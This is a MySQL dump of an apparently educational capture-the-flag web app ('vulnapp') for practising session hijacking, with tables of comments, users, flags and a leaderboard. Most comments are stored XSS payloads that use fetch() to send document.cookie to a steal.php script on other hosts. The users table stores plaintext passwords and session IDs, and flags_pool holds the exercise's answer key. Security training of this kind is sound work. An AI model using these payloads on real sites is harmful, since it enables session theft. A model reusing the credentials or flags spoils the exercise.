-- MySQL dump 10.13  Distrib 8.0.41, for Linux (x86_64)
--
-- Host: localhost    Database: vulnapp
-- ------------------------------------------------------
-- Server version	8.0.41-0ubuntu0.24.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `comments`
--

DROP TABLE IF EXISTS `comments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `comments` (
  `id` int NOT NULL AUTO_INCREMENT,
  `text` text NOT NULL,
  `username` varchar(50) NOT NULL DEFAULT 'Anonymous',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=50 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `comments`
--

LOCK TABLES `comments` WRITE;
/*!40000 ALTER TABLE `comments` DISABLE KEYS */;
INSERT INTO `comments` VALUES (5,'<script>fetch(\'http://172.16.230.30/capturesession/steal.php?cookie=\'+document.cookie);</script>','saurabh'),(6,'hello everyone <script>fetch(\'http://172.16.230.30/capturesession/steal.php?cookie=\'+document.cookie);</script>','saurabh'),(7,'hello all','SURAJ'),(8,'helooooooooooo','mahi'),(10,'Sup','Aryan'),(12,'hungryy','Aryan'),(16,'<script>fetch(http://172.20.10.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','shweta'),(17,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','sakshi'),(18,'<script>fetch(\'http://172.16.230.24/capturesession/steal.php?cookie=\'+document.cookie);</script>','Aryan'),(19,'<script>fetch(\'http://172.20.10.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','SURAJ'),(20,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','admin'),(21,'<script>fetch(\'http://http://172.16.230.24/capturesession/steal.php?cookie=\'+document.cookie);</script>','mahi'),(22,'<script>fetch(\'http://http://172.16.230.24/capturesession/steal.php?cookie=\'+document.cookie);</script>','mahi'),(23,'lol i logged in with mahi\'s account','mahi'),(24,'lol i logged in with mahi\'s account','Guest'),(25,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','sakshi'),(26,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','Guest'),(27,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','sakshi'),(28,'This is not me haha','sakshi'),(29,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','sakshi'),(30,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','Guest'),(31,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','sakshi'),(32,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','Aryan'),(33,'Hi there noobs','Aryan'),(34,'<script>fetch(\'http://http://172.16.230.24/capturesession/steal.php?cookie=\'+document.cookie);</script>','mahi'),(35,'Hi there noobs','Guest'),(36,'<script>fetch(\'http://172.20.10.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','Guest'),(37,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','sakshi'),(38,'<script>fetch(\'http://172.20.10.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','shweta'),(39,'<script>fetch(\'http://172.20.10.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','Guest'),(40,'<script>fetch(\'http://172.20.10.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','Guest'),(41,'haahaha devil here','shweta'),(42,'hello world','admin'),(43,'get the flag at admin.php','admin'),(44,'not me seriouly','Guest'),(45,'pratik jay k sath bromance mat kar','pratik'),(46,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','sakshi'),(47,'<script>fetch(\'http://http://172.16.230.24/capturesession/steal.php?cookie=\'+document.cookie);</script>','mahi'),(48,'<script>fetch(\'http://172.20.210.5/capturesession/steal.php?cookie=\'+document.cookie);</script>','Guest'),(49,'Hello, Payload has been dropped <script>fetch(\'http://172.20.10.2/capturesession/steal.php?cookie=\'+document.cookie);</script>','ONKAR');
/*!40000 ALTER TABLE `comments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `flags`
--

DROP TABLE IF EXISTS `flags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `flags` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `submitted_flag` varchar(100) NOT NULL,
  `submission_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `flags`
--

LOCK TABLES `flags` WRITE;
/*!40000 ALTER TABLE `flags` DISABLE KEYS */;
/*!40000 ALTER TABLE `flags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `flags_pool`
--

DROP TABLE IF EXISTS `flags_pool`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `flags_pool` (
  `id` int NOT NULL AUTO_INCREMENT,
  `flag_value` varchar(100) NOT NULL,
  `is_used` tinyint(1) DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `flag_value` (`flag_value`)
) ENGINE=InnoDB AUTO_INCREMENT=34 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `flags_pool`
--

LOCK TABLES `flags_pool` WRITE;
/*!40000 ALTER TABLE `flags_pool` DISABLE KEYS */;
INSERT INTO `flags_pool` VALUES (1,'FLAG{sess_9z8d-1h4ck3r}',0),(2,'FLAG{auth_byp4ss_12x}',0),(3,'FLAG{xss_steal_7kmn}',0),(4,'FLAG{hijack_phpSess_02}',0),(5,'FLAG{csrf_token_leak_1a2b}',1),(6,'FLAG{burp_sqli_8d5f}',0),(7,'FLAG{cookie_monster_78z}',0),(8,'FLAG{capture_the_admin_9x}',0),(9,'FLAG{js_payload_4m7n}',0),(10,'FLAG{phishing_cred_66a}',0),(11,'FLAG{replay_attack_78f}',0),(12,'FLAG{brute_force_login_101}',0),(13,'FLAG{user_enum_3z5}',0),(14,'FLAG{hidden_input_exposed_4t9}',0),(15,'FLAG{jwt_none_alg_5m2}',0),(16,'FLAG{session_fixation_z1x9}',0),(17,'FLAG{clickjacking_p0c_88}',0),(18,'FLAG{lfi_rce_pwned_010}',0),(19,'FLAG{path_traversal_77z}',0),(20,'FLAG{idor_broken_4d5f}',0),(21,'FLAG{xxe_injection_8m3}',0),(22,'FLAG{race_condition_win}',0),(23,'FLAG{insecure_direct_obj_4t6}',0),(24,'FLAG{open_redirect_9y6}',0),(25,'FLAG{weak_ssl_tls_303}',0),(26,'FLAG{ftp_anonymous_1a7}',0),(27,'FLAG{hardcoded_keys_88m}',0),(28,'FLAG{subdomain_takeover_x9}',0),(29,'FLAG{cve_exploit_404}',0),(30,'FLAG{cors_misconfig_787}',0),(31,'FLAG{dns_spoofing_1n9}',0),(32,'FLAG{public_s3_bucket_45k}',0),(33,'FLAG{logic_bypass_w1n}',0);
/*!40000 ALTER TABLE `flags_pool` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `leaderboard`
--

DROP TABLE IF EXISTS `leaderboard`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `leaderboard` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `session_id` varchar(100) NOT NULL,
  `hijack_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `leaderboard`
--

LOCK TABLES `leaderboard` WRITE;
/*!40000 ALTER TABLE `leaderboard` DISABLE KEYS */;
/*!40000 ALTER TABLE `leaderboard` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `role` varchar(10) NOT NULL,
  `session_id` varchar(100) NOT NULL DEFAULT '',
  `assigned_flag` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'ADMIN','ADMIN123!','admin\r','admin_19b8341d88','FLAG{jwt_none_alg_5m2}'),(2,'ADITYA','1262240304','user\r','',NULL),(3,'AMI','1262240966','user\r','',NULL),(4,'ARYAN','1262241637','user\r','Aryan_2e8e8e8d80',NULL),(5,'BHARG','1262243415','user\r','',NULL),(6,'FAWAD','1262242492','user\r','',NULL),(7,'HARMISH','1262241136','user\r','',NULL),(8,'HIMANSHU','1262243362','user\r','',NULL),(9,'JAY','1262241352','user\r','',NULL),(10,'MAHI','1262240446','user\r','mahi_e6b93218d8',NULL),(11,'MEGHANA','1262241830','user\r','',NULL),(12,'MIHIR','1262243392','user\r','',NULL),(13,'MRUNAL','1262243384','user\r','',NULL),(14,'ONKAR','1262240369','user\r','ONKAR_6388d7f726',NULL),(15,'HEMANTH','1262243397','user\r','euhlq1lgf5t3c4ricon2ehcoqo',NULL),(16,'PRAJWAL','1262243344','user\r','',NULL),(17,'PRANAV','1262243464','user\r','',NULL),(18,'PRANAV','1262242774','user\r','',NULL),(19,'PRATHAM','1262240412','user\r','',NULL),(20,'PRATIK','1262240524','user\r','pratik_af493f6e65',NULL),(21,'PRIYA','1262240541','user\r','',NULL),(22,'RAHUL','1262240437','user\r','',NULL),(23,'SAHIL','1262243388','user\r','',NULL),(24,'SAKSHI','1262240535','user\r','sakshi_c1802f48cf',NULL),(25,'SAMIDHA','1262240358','user\r','samidha_08bce50c11',NULL),(26,'SAURABH','1262241012','user\r','saurabh_fc7cb22893',NULL),(27,'SHIVAM','1262241847','user\r','',NULL),(28,'SHWETA','1262242025','user\r','shweta_4d1bb91164',NULL),(29,'SONIYA','1262240329','user\r','',NULL),(30,'SOURABH','1262240377','user\r','',NULL),(31,'SURAJ','1262240448','user\r','SURAJ_6c701e8f5e',NULL),(32,'TAUSIF','1262243381','user\r','',NULL),(33,'VEDANT','1262240396','user\r','',NULL),(34,'VISHAKHA','1262241170','user\r','',NULL),(35,'VISHAL','1262240380','user\r','vishal_acfc49d470',NULL),(36,'YATIN','1262240471','user','',NULL);
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-03-13 18:08:29
